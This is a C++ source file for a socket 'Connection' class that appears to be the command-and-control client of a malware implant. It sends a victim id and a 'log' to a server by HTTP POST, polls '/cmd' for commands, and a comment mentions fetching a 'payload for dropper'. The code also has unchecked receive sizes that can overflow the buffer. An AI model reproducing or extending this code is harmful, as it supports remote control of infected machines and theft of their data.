#include "stdafx.h"
#include "Connection.h"

void Connection::Send(char* message)
{
	send(server, message, sizeof(char) * strlen(message), 0);
}
char* Connection::Recv()
{
	recv(server, buf, sizeof(char) * 1000000, 0);
	return GetBuf();
	// probably you should send and receive payload for dropper in chunks of 1024 bytes so that the buffer doesn't overflows
}
void Connection::SendBasicInfo(string id, string log)
{
	ostringstream FormBuffer;

	char DataType1[] = "id=";
	char DataType2[] = "&log=";

	char FormAction[] = "/";

	// get: length of the actual content
	int ContentLength = id.length() + log.length() + strlen(DataType1) + strlen(DataType2);

	// header
	FormBuffer << "POST " << FormAction << " HTTP/1.1\n";
	FormBuffer << "Content-Type: application/x-www-form-urlencoded\n";
	FormBuffer << "Host: \n";
	FormBuffer << "Content-Length: " << to_string(ContentLength) << "\n\n";

	// actual content
	FormBuffer << DataType1 << id;
	FormBuffer << DataType2 << log;

	const auto str = FormBuffer.str();
	send(server, str.data(), str.size(), NULL);
	shutdown(server, SD_SEND);
	recv(server, buf, sizeof(char) * 1000000, 0);
	shutdown(server, SD_RECEIVE);
}
char* Connection::ReadCommand()
{
	ostringstream FormBuffer;

	// header	
	FormBuffer << "GET /cmd HTTP/1.1\n";
	FormBuffer << "Host: 127.0.0.1 \n";
	FormBuffer << "Connection: close\n";
	const auto str = FormBuffer.str();
	send(server, str.data(), str.size(), NULL);
	shutdown(server, SD_SEND);
	Sleep(1);
	recv(server, buf, sizeof(char) * 1000000, 0);
	shutdown(server, SD_RECEIVE);

	int pos = strlen(buf);
	while (buf[pos] != '\n')
		--pos;
	++pos;
	char *new_ptr = buf + pos;
	return new_ptr;
}